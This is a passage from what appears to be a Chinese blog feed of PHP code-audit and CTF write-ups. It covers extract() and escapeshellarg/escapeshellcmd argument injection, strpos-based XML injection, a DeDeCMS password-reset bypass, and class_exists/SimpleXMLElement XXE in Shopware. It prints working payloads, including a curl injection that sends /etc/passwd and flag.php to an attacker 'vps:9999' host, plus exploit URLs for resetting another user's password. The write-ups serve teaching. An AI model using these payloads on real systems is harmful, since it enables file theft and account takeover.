函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， <strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> ，所以这里会变成 <strong>$_GET[flag]&#x3D;test</strong> ，这里的 <strong>$_GET</strong> 变量就不需要再经过 <strong>waf</strong> 函数检测了，也就绕过了 <strong>preg_match(‘&#x2F;flag&#x2F;i’,$key)</strong> 的限制。</p><p>然后就是弱比较，0e开头这里不赘述</p><p>接着是<strong>escapeshellarg()</strong> 和 **escapeshellcmd()**利用：</p><ul><li><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li><li><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;<code>|*?~&lt;&gt;^()[]&#123;&#125;$</code>, <code>x0A</code> 和 <code>xFF</code>, <code>&#39;</code> 和 <code>&quot;</code>仅在不配对儿的时候被转义。</li></ul><p><img src="/archives/1efa6206/image-20251021205735555.png" alt="image-20251021205735555"></p><p>在字符串增加了引号同时会进行转义，那么之前的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd</span><br></pre></td></tr></table></figure><p>因为增加了 <strong>‘</strong> 进行了转义，所以整个字符串会被当成参数。注意 <strong>escapeshellcmd</strong> 的问题是在于如果 <strong>‘</strong> 和 <strong>“</strong> 仅在不配对儿的时候被转义。那么如果我们多增加一个 <strong>‘</strong> 就可以扰乱之前的转义了。如下：</p><p><img src="/archives/1efa6206/image-20251021205814503.png" alt="image-20251021205814503"></p><p>在 <strong>curl</strong> 中存在 <strong>-F</strong> 提交表单的方法，也可以提交文件。 <strong>-F &lt;key&#x3D;value&gt;</strong> 向服务器POST表单，例如： <strong>curl -F “web&#x3D;@index.html;type&#x3D;text&#x2F;html” url.com</strong> 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。那么最后的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&#x27; -F file=@/etc/passwd -x  vps:9999</span><br></pre></td></tr></table></figure><p>所以payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?flag=QNKCDZO&amp;hongri=s878926199a&amp;url=http://baidu.com/&#x27;</span> -<span class="keyword">F</span> <span class="string">file=@/var/www/html/flag.php</span> -x <span class="string"></span> vps:9999 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 127.0.0.1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"></span><br><span class="line"><span class="language-sqf"><span class="variable">_GET</span>[<span class="built_in">flag</span>]=QNKCDZO&amp;<span class="variable">_GET</span>[hongri]=s878926199a&amp;<span class="variable">_GET</span>[url]=http:<span class="comment">//baidu.com/&#x27; -F file=@/var/www/html/flag.php -x  vps:9999</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> php代码审计 </category>
          
          <category> 红日代审 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红日代审 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日代审Day4-strpos函数缺陷</title>
      <link href="/archives/22555f4/"/>
      <url>/archives/22555f4/</url>
      
        <content type="html"><![CDATA[<h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><p><img src="/archives/22555f4/image-20251019214951715.png" alt="image-20251019214951715"></p><ul><li><p><code>haystack</code></p><p>在该字符串中进行查找。</p></li><li><p><code>needle</code></p><p>要搜索的字符串。</p></li><li><p><code>offset</code></p><p>如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。</p></li><li><p>返回值</p><p>返回 needle 存在于 <code>haystack</code> 字符串起始的位置(独立于 <code>offset</code>)。 同时注意字符串位置是从<code>0</code>开始，而不是从<code>1</code>开始的。</p><p>如果没找到 needle，将返回 **<code>false</code>**。</p><p><strong>警告</strong>：此函数可能返回布尔值 **<code>false</code>**，但也可能返回等同于 <strong><code>false</code></strong> 的非布尔值。请阅读 <a href="https://www.php.net/manual/zh/language.types.boolean.php">布尔类型</a>章节以获取更多信息。应使用 <a href="https://www.php.net/manual/zh/language.operators.comparison.php">&#x3D;&#x3D;&#x3D; 运算符</a>来测试此函数的返回值。</p></li></ul><p>demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mystring</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="variable">$findme</span>   = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$mystring</span>, <span class="variable">$findme</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意这里使用的是 ===。简单的 == 不能像我们期待的那样工作，</span></span><br><span class="line"><span class="comment">// 因为 &#x27;a&#x27; 是第 0 位置上的（第一个）字符。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pos</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The string &#x27;<span class="subst">$findme</span>&#x27; was not found in the string &#x27;<span class="subst">$mystring</span>&#x27;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The string &#x27;<span class="subst">$findme</span>&#x27; was found in the string &#x27;<span class="subst">$mystring</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; and exists at position <span class="subst">$pos</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Demo分析"><a href="#Demo分析" class="headerlink" title="Demo分析"></a>Demo分析</h2><p><img src="/archives/22555f4/image-20251019215317907.png" alt="image-20251019215317907"></p><p>我们看到 <strong>第11行</strong> 和 <strong>第12行</strong> ，程序通过格式化字符串的方式，使用 <strong>xml</strong> 结构存储用户的登录信息。实际上这样很容易造成数据注入。然后 <strong>第21行</strong> 实例化 <strong>Login</strong> 类，并在 <strong>第16行</strong> 处调用 <strong>login</strong> 方法进行登陆操作。在进行登录操作之前，代码在 <strong>第8行</strong> 和 <strong>第9行</strong> 使用 <strong>strpos</strong> 函数来防止输入的参数含有 <strong>&lt;** 和 **&gt;</strong> 符号，猜测开发者应该是考虑到非法字符注入问题。</p><p>而<strong>strpos</strong> 函数返回查找到的子字符串的下标。如果字符串开头就是我们要搜索的目标，则返回下标 <strong>0</strong> ；如果搜索不到，则返回 <strong>false</strong> 。在这道题目中，开发者只考虑到 <strong>strpos</strong> 函数返回 <strong>false</strong> 的情况，却忽略了匹配到的字符在首位时会返回 <strong>0</strong> 的情况，因为 <strong>false</strong> 和 <strong>0</strong> 的取反均为 <strong>true</strong> 。这样我们就可以在用户名和密码首字符注入 <strong>&lt;</strong> 符号，从而注入xml数据。我们尝试使用以下 <strong>payload</strong> ，观察 <strong>strpos</strong> 函数的返回结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&lt;<span class="string">&quot;&gt;&lt;injected-tag%20property=&quot;</span>&amp;pass=&lt;injected-tag&gt;</span><br></pre></td></tr></table></figure><p><img src="/archives/22555f4/image-20251019220023977.png" alt="image-20251019220023977"></p><p>如上图所示，很明显是可以注入xml数据的。</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>环境：DeDecms V5.7SP2正式版</p><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>该CMS存在未修复的任意用户密码重置漏洞。漏洞的触发点在 <strong>member&#x2F;resetpassword.php</strong> 文件中，由于对接收的参数 <strong>safeanswer</strong> 没有进行严格的类型判断，导致可以使用弱类型比较绕过。我们来看看相关代码：</p><p><img src="/archives/22555f4/image-20251019221427384-17608832692311.png" alt="image-20251019221427384"></p><p>针对上面的代码做个分析，当 <strong>$dopost</strong> 等于 <strong>safequestion</strong> 的时候，通过传入的 <strong>$mid</strong> 对应的 <strong>id</strong> 值来查询对应用户的安全问题、安全答案、用户id、电子邮件等信息。跟进到 <strong>第11行</strong> ，当我们传入的问题和答案非空，而且等于之前设置的问题和答案，则进入 <strong>sn</strong> 函数。然而这里使用的是 <strong>&#x3D;&#x3D;</strong> 而不是 <strong>&#x3D;&#x3D;&#x3D;</strong> 来判断，所以是可以绕过的。假设用户没有设置安全问题和答案，那么默认情况下安全问题的值为 <strong>0</strong> ，答案的值为 <strong>null</strong> （这里是数据库中的值，即 <strong>$row[‘safequestion’]&#x3D;”0”</strong> 、 <strong>$row[‘safeanswer’]&#x3D;null</strong> ）。当没有设置 <strong>safequestion</strong> 和 <strong>safeanswer</strong> 的值时，它们的值均为空字符串。第11行的if表达式也就变成了 <strong>if(‘0’ &#x3D;&#x3D; ‘’ &amp;&amp; null &#x3D;&#x3D; ‘’)</strong> ，即 <strong>if(false &amp;&amp; true)</strong> ，所以我们只要让表达式 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong> 为 <strong>true</strong> 即可。下图是 <strong>null &#x3D;&#x3D; ‘’</strong> 的判断结果：</p><p><img src="/archives/22555f4/image-20251019221710106.png" alt="image-20251019221710106"></p><p>我们可以利用 <strong>php弱类型</strong> 的特点，来绕过这里 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong> 的判断，如下：</p><p><img src="/archives/22555f4/image-20251019221744862.png" alt="image-20251019221744862"></p><p>通过测试找到了三个的payload，分别是 <strong>0.0</strong> 、 <strong>0.</strong> 、 <strong>0e1</strong> ，这三种类型payload均能使得 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong>  为 <strong>true</strong> ，即成功进入 <strong>sn</strong> 函数。跟进 <strong>sn</strong> 函数，相关代码在 <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> 文件中，具体代码如下：</p><p><img src="/archives/22555f4/image-20251019221813257.png" alt="image-20251019221813257"></p><p>在 <strong>sn</strong> 函数内部，会根据id到pwd_tmp表中判断是否存在对应的临时密码记录，根据结果确定分支，走向 <strong>newmail</strong> 函数。假设当前我们第一次进行忘记密码操作，那么此时的 <strong>$row</strong> 应该为空，所以进入第一个 <strong>if(!is_array($row))</strong> 分支，在 <strong>newmail</strong> 函数中执行 <strong>INSERT</strong> 操作，相关操作代码位置在 <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> 文件中，关键代码如下：</p><p><img src="/archives/22555f4/image-20251019221942740.png" alt="image-20251019221942740"></p><p>该代码主要功能是发送邮件至相关邮箱，并且插入一条记录至 <strong>dede_pwd_tmp</strong> 表中。而恰好漏洞的触发点就在这里，我们看看 <strong>第13行</strong> 至 <strong>第18行</strong> 的代码，如果 <strong>($send &#x3D;&#x3D; ‘N’)</strong> 这个条件为真，通过 <strong>ShowMsg</strong> 打印出修改密码功能的链接。 <strong>第17行</strong> 修改密码链接中的 <strong>$mid</strong> 参数对应的值是用户id，而 <strong>$randval</strong> 是在第一次 <strong>insert</strong> 操作的时候将其 <strong>md5</strong> 加密之后插入到 <strong>dede_pwd_tmp</strong> 表中，并且在这里已经直接回显给用户。那么这里拼接的url其实是：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/member/resetpassword.php?dopost=getpasswd&amp;id=$mid&amp;key=$randval</span><br></pre></td></tr></table></figure><p>继续跟进一下 <strong>dopost&#x3D;getpasswd</strong> 的操作，相关代码位置在 <strong>member&#x2F;resetpassword.php</strong> 中:<br><img src="/archives/22555f4/image-20251019222320071.png" alt="image-20251019222320071"></p><p>在重置密码的时候判断输入的用户id是否执行过重置密码，如果id为空则退出；如果 <strong>$row</strong> 不为空，则会执行以下操作内容，相关代码在 <strong>member&#x2F;resetpassword.php</strong> 中。</p><p><img src="/archives/22555f4/image-20251019222430345.png" alt="image-20251019222430345"></p><p>上图代码会先判断是否超时，如果没有超时，则进入密码修改页面。在密码修改页面会将 <strong>$setp</strong> 赋值为2。</p><p><img src="/archives/22555f4/image-20251019222516900.png" alt="image-20251019222516900"></p><p>由于现在的数据包中 <strong>$setp&#x3D;2</strong> ，因此这部分功能代码实现又回到了 <strong>member&#x2F;resetpassword.php</strong> 文件中。</p><p><img src="/archives/22555f4/image-20251019222551822.png" alt="image-20251019222551822"></p><p>上图代码 <strong>第6行</strong> 判断传入的 <strong>$key</strong> 是否等于数据库中的 <strong>$row[‘pwd’]</strong> ，如果相等就完成重置密码操作，至此也就完成了整个攻击的分析过程。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们分别注册 <strong>test1</strong> ， <strong>test2</strong> 两个账号</p><p>第一步访问 <strong>payload</strong> 中的 <strong>url</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedecms/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;<span class="built_in">id</span>=9</span><br></pre></td></tr></table></figure><p>这里 <strong>test2</strong> 的id是9</p><p><img src="/archives/22555f4/image-20251019222749751.png" alt="image-20251019222749751"></p><p><img src="/archives/22555f4/image-20251019222800377.png" alt="image-20251019222800377"></p><p>通过抓包获取到 <strong>key</strong> 值。</p><p><img src="/archives/22555f4/17.png" alt="17"></p><p>去掉多余的字符访问修改密码链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.240/dedecms/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=OTyEGJtg</span><br></pre></td></tr></table></figure><p><img src="/archives/22555f4/18.png" alt="18"></p><p>最后成功修改密码，我将密码修改成 <strong>123456</strong> ，数据库中 <strong>test2</strong> 的密码字段也变成了 <strong>123456</strong> 加密之后的值。</p><p><img src="/archives/22555f4/20.png" alt="20"></p><h2 id="CTF例题练习"><a href="#CTF例题练习" class="headerlink" title="CTF例题练习"></a>CTF例题练习</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>题目链接: <a href="https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ">https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ</a> 密码: 59t2</p><p><img src="/archives/22555f4/image-20251019221134058.png" alt="image-20251019221134058"></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目为QCTF 2018中的一道题目，场景就是一个彩票系统，每位用户初始情况下有20$，由用户输入一个7位数，系统也会随机生成一个7位数。然后逐位数字进行比较，位数相同的个数越多，奖励的钱也越多。当你的钱足够买flag的时候，系统就会给你flag。</p><p><img src="/archives/22555f4/image-20251019224125847.png" alt="image-20251019224125847"></p><p>我们来看一下后台代码是如何进行比较的，比较代码在 <strong>buy.php</strong> 文件中：</p><p><img src="/archives/22555f4/image-20251019224313114.png" alt="image-20251019224313114"></p><p>在上图中看到表单的部分( <strong>代码4-8行</strong> )，调用了 <strong>js&#x2F;buy.js</strong> 文件，应该是用来处理上面的表单的，我们具体看一下 <strong>js</strong> 代码：</p><p><img src="/archives/22555f4/image-20251019224531669.png" alt="image-20251019224531669"></p><p>在 <strong>第10行</strong> 处看到，程序将表单数据以 <strong>json</strong> 格式提交到服务器端，提交页面为 <strong>api.php</strong> ，我们转到该文件看看：</p><p><img src="/archives/22555f4/image-20251019224836128.png" alt="image-20251019224836128"></p><p>这里主要是对数字进行比较，注意 <strong>第13行</strong> 用的是 <strong>&#x3D;&#x3D;</strong> 操作符对数据进行比较，这里会引发安全问题。因为用户的数据是以 <strong>json</strong> 格式传上来的，如果我们传一个数组，里面包含7个 <strong>true</strong> 元素，这样在比较的时候也是能相等的。因为 <strong>&#x3D;&#x3D;</strong> 运算符只会判断两边数据的值是否相等，并不会判断数据的类型。而语言定义，除了 <strong>0、false、null</strong> 以外均为 <strong>true</strong> ，所以使用 <strong>true</strong> 和数字进行比较，返回的值肯定是 true 。只要后台生成的随机数没有数字0，我们传入的payload就能绕过每位数字的比较。我们发送几次payload后，就可以买到flag了。</p><p><img src="/archives/22555f4/image-20251021212439981.png" alt="image-20251021212439981"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> php代码审计 </category>
          
          <category> 红日代审 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红日代审 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日代审Day3-实例化任意对象漏洞</title>
      <link href="/archives/3fef33c2/"/>
      <url>/archives/3fef33c2/</url>
      
        <content type="html"><![CDATA[<h2 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h2><p><img src="/archives/3fef33c2/image-20251019195753345.png" alt="image-20251019195753345"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">class_exists</span>(<span class="keyword">string</span> <span class="variable">$class</span>, <span class="keyword">bool</span> <span class="variable">$autoload</span> = <span class="literal">true</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><ul><li><p><code>class</code></p><p>类名。名称以不区分大小写的方式匹配。</p></li><li><p><code>autoload</code></p><p>如果尚未加载，是否<a href="https://www.php.net/manual/zh/language.oop5.autoload.php">自动加载</a>。</p></li><li><p>返回值</p><p>如果 <code>class</code> 是已经定义的类，则返回 **<code>true</code>**，否则返回 **<code>false</code>**。</p></li></ul><p>demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(function (<span class="variable">$class_name</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$class_name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 include 后是否声明了类</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">class_exists</span>(<span class="variable">$class_name</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">LogicException</span>(<span class="string">&quot;Unable to load class: <span class="subst">$class_name</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">class_exists</span>(<span class="title class_">MyClass</span>::<span class="variable language_">class</span>)) &#123;</span><br><span class="line">    <span class="variable">$myclass</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p><strong>SimpleXMLElement</strong> 是 PHP 中的一个内置类，用于<strong>解析和操作 XML 数据</strong>。它是一个非常轻量级且直观的工具，可以将 XML 数据解析为对象形式，允许你以类似对象的方式访问和修改 XML 元素和属性</p><p>类摘要：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleXMLElement</span> <span class="keyword">implements</span> <span class="title">Stringable</span>, <span class="title">Countable</span>, <span class="title">RecursiveIterator</span> </span>&#123;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__construct</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$data</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$dataIsURL</span> = <span class="literal">false</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$namespaceOrPrefix</span> = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$isPrefix</span> = <span class="literal">false</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">addAttribute</span>(<span class="keyword">string</span> <span class="variable">$qualifiedName</span>, <span class="keyword">string</span> <span class="variable">$value</span>, ?<span class="keyword">string</span> <span class="variable">$namespace</span> = <span class="literal">null</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">addChild</span>(<span class="keyword">string</span> <span class="variable">$qualifiedName</span>, ?<span class="keyword">string</span> <span class="variable">$value</span> = <span class="literal">null</span>, ?<span class="keyword">string</span> <span class="variable">$namespace</span> = <span class="literal">null</span>): ?SimpleXMLElement</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">asXML</span>(?<span class="keyword">string</span> <span class="variable">$filename</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">attributes</span>(?<span class="keyword">string</span> <span class="variable">$namespaceOrPrefix</span> = <span class="literal">null</span>, <span class="keyword">bool</span> <span class="variable">$isPrefix</span> = <span class="literal">false</span>): ?SimpleXMLElement</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">children</span>(?<span class="keyword">string</span> <span class="variable">$namespaceOrPrefix</span> = <span class="literal">null</span>, <span class="keyword">bool</span> <span class="variable">$isPrefix</span> = <span class="literal">false</span>): ?SimpleXMLElement</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">count</span>(): <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">current</span>(): SimpleXMLElement</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getDocNamespaces</span>(<span class="keyword">bool</span> <span class="variable">$recursive</span> = <span class="literal">false</span>, <span class="keyword">bool</span> <span class="variable">$fromRoot</span> = <span class="literal">true</span>): <span class="keyword">array</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getName</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getNamespaces</span>(<span class="keyword">bool</span> <span class="variable">$recursive</span> = <span class="literal">false</span>): <span class="keyword">array</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getChildren</span>(): ?SimpleXMLElement</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">hasChildren</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">key</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">next</span>(): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">registerXPathNamespace</span>(<span class="keyword">string</span> <span class="variable">$prefix</span>, <span class="keyword">string</span> <span class="variable">$namespace</span>): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">rewind</span>(): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__toString</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">valid</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">xpath</span>(<span class="keyword">string</span> <span class="variable">$expression</span>): <span class="keyword">array</span>|<span class="literal">null</span>|<span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Demo分析"><a href="#Demo分析" class="headerlink" title="Demo分析"></a>Demo分析</h2><p><img src="/archives/3fef33c2/image-20251019202416318.png" alt="image-20251019202416318"></p><p>这段代码中存在两个安全漏洞。第一个是文件包含漏洞，上图第8行中使用了 <strong>class_exists()</strong> 函数来判断用户传过来的控制器是否存在，默认情况下，如果程序存在 <strong>__autoload</strong> 函数，那么在使用 <strong>class_exists()</strong> 函数就会自动调用本程序中的 <strong>__autoload</strong> 函数，这题的文件包含漏洞就出现在这个地方。攻击者可以使用 <strong>路径穿越</strong> 来包含任意文件，当然使用路径穿越符号的前提是 <strong>PHP5~5.3(包含5.3版本)版本</strong> 之间才可以。例如类名为： <strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</strong> 的查找，将查看passwd文件内容</p><p>即**$controllerName&#x3D;$_GET[‘c’];<strong>可控，随后传入 <strong>class_exists()</strong> 函数，此时会调用</strong>__autoload** 函数触发**<code>include $className;</code>**造成文件包含，于是就可以通过路径穿越包含任意文件。</p><p>而第二个漏洞在于上图第9行，我们发现实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect）</p><p>关于 <strong>SimpleXMLElement</strong> 导致的XXE攻击，下面再给出一个demo案例，方便大家理解：</p><p><img src="/archives/3fef33c2/image-20251019203208110.png" alt="image-20251019203208110"></p><p>这里<strong>SimpleXMLElement</strong>实例第一个参数是我们要解析的XML字符串，而第二个参数<strong>LIBXML_NOENT</strong>是漏洞的关键，即<strong>启用实体替换</strong>，这样就能够加载外部实体造成XXE漏洞</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>环境：shopware 5.3.3</p><p>该cms漏洞在<strong>engine\Shopware\Controllers\Backend\ProductStream.php</strong> 文件中有一个 <strong>loadPreviewAction</strong> 方法，其作用是用来预览产品流的详细信息，具体代码如下：</p><p><img src="/archives/3fef33c2/image-20251019203750454.png" alt="image-20251019203750454"></p><p>该方法接收从用户传来的参数 <strong>sort</strong> ，然后传入 <strong>Repository</strong> 类的 <strong>unserialize</strong> 方法（如上图第11-14行代码），我们跟进 <strong>Repository</strong> 类，查看 <strong>unserialize</strong> 方法的实现。该方法我们可以在 <strong>engine\Shopware\Components\ProductStream\Repository.php</strong> 文件中找到，代码如下：</p><p><img src="/archives/3fef33c2/image-20251019204002157.png" alt="image-20251019204002157"></p><p>可以看到 <strong>Repository</strong> 类的 <strong>unserialize</strong> 方法，调用的是 <strong>LogawareReflectionHelper</strong> 类的 <strong>unserialize</strong> 方法（如上图第5行代码），该方法我们可以在 <strong>engine\Shopware\Components\LogawareReflectionHelper.php</strong> 文件中找到，具体代码如下：</p><p><img src="/archives/3fef33c2/image-20251019204201637.png" 